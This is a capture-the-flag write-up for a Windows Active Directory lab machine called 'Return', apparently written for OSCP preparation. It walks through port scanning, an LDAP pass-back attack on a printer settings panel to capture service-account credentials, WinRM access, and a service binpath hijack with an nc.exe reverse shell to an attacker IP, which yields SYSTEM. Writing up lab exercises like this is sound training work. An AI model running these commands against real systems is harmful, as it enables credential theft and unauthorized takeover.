# Return-TJNULL-OSCP-



---

## Executive Summary

- **Target OS:** Windows
- **Difficulty:** Easy
- **Domain:** `return.local`
- **Key Concepts:** Active Directory Infrastructure, Web-to-LDAP Relay (Pass-Back), WinRM Remote Management, Service Binary Path Hijacking.

---

## 1. Enumeration & Information Gathering

### Port Scanning (Nmap)

The initial infrastructure assessment began with a high-speed TCP port discovery scan across all 65,355 ports to identify active entry points quickly:

```bash
nmap -Pn -n -p- -sS --min-rate 5000 --open -oG allPorts <TARGET_IP>

```

A secondary targeted scan was executed against the discovered ports to probe for service versions and execute default NSE script audits:

```bash
nmap -p53,88,135,139,389,445,464,636,3268,3269,5985 -sCV -oN targeted <TARGET_IP>

```

### Local Environment Setup

To ensure proper routing and interaction with potential Active Directory services, the domain was appended to the local `/etc/hosts` resolution file:

```bash
sudo nano /etc/hosts
# Append line: <TARGET_IP> return.local

```

---

## 2. Initial Access & Foothold

### Web Interface & LDAP Vector Investigation

1. Navigating to `http://return.local` reveals a web-based administration printer settings panel.
2. Under the **Settings** sub-menu, an internal printer configuration application is exposed, showing setup fields for an underlying LDAP server connectivity test.

### Exploitation: LDAP Pass-Back Attack

Since the web application permits custom modifications to the LDAP service endpoint address, a **Pass-Back Attack** can be executed to force the internal service account to authenticate against a rogue attacker-controlled listener.

Set up a standard network listener on the default LDAP port (`389`) on the attacker infrastructure:

```bash
nc -lvnp 389

```

1. In the web management console, update the **Server Address** parameter to target the attacker machine's IP address.
2. Submit the configuration modification.
3. The device automatically triggers an authentication handshake, transmitting the plaintext credentials for the service account to the listener.

### Credential Validation

The intercepted cleartext credentials (`svc-printer` : `<PASSWORD>`) were verified via the SMB protocol using the `crackmapexec` security suite:

```bash
crackmapexec smb return.local -u 'svc-printer' -p '<PASSWORD>'

```

### Remote Shell Management (WinRM)

With successful validation and noting that port `5985` (WinRM) is open, a highly functional, interactive remote terminal session was established via `evil-winrm`:

```bash
evil-winrm -i return.local -u 'svc-printer' -p '<PASSWORD>'

```

### Retrieving User Flags

```cmd
cd ../Desktop
type user.txt

```

---

## 3. Privilege Escalation

### Local Environment Enumeration

An audit of the current user account's group associations and privileges was conducted:

```cmd
net user svc-printer

```

The output reveals that the `svc-printer` service account is a member of custom operator groups (e.g., `Server Operators`), granting it the rights to manipulate and reconfigure system services via `sc.exe`.

### Exploitation: Service Binary Path Hijacking (`vss`)

The Volume Shadow Copy service (`vss`) was identified as a viable target for path reconfiguration due to broad privilege permissions.

*Prerequisite: Ensure a Windows-compatible Netcat binary (`nc.exe`) is uploaded onto the target machine (e.g., inside `C:\Users\svc-printer\Desktop\`).*

1. Reconfigure the binary path (`binpath`) attribute of the `vss` service to execute a persistent reverse shell payload calling back to the handler:

```cmd
sc.exe config vss binpath= "C:\Users\svc-printer\Desktop\nc.exe <ATTACKER_IP> 4444 -e cmd.exe"

```

2. Establish an active command-and-control handler on the attacker system to catch the privileged payload execution:

```bash
nc -lvnp 4444

```

3. Force the execution of the newly modified path binary by restarting or manually instantiating the service state:

```cmd
sc.exe start vss

```

---

## 4. Administrative Consolidation

Upon intercepting the incoming callback connection on port `4444`, system identity verification was performed:

```cmd
whoami
# Expected Output: nt authority\system

```

### Retrieving Root Flags

```cmd
cd \
cd Users\Administrator\Desktop
type root.txt

```

```

```
